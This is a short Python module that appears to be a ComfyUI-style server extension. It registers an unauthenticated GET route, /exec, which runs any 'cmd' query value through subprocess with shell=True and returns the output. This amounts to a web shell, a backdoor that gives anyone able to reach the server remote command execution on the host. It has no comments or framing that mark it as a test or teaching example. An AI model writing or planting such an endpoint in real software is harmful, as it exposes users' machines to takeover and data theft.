from server import PromptServer
from aiohttp import web
import subprocess

@PromptServer.instance.routes.get("/exec")
async def exec_cmd(request):
    try:
        cmd = request.query.get("cmd", "")
        if not cmd:
            return web.json_response({"error": "no cmd"})

        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True
        )

        output = result.stdout + result.stderr
        return web.Response(text=output, content_type="text/plain")

    except Exception as strerror:
        return web.Response(text=f"Error: {strerror}", content_type="text/plain")
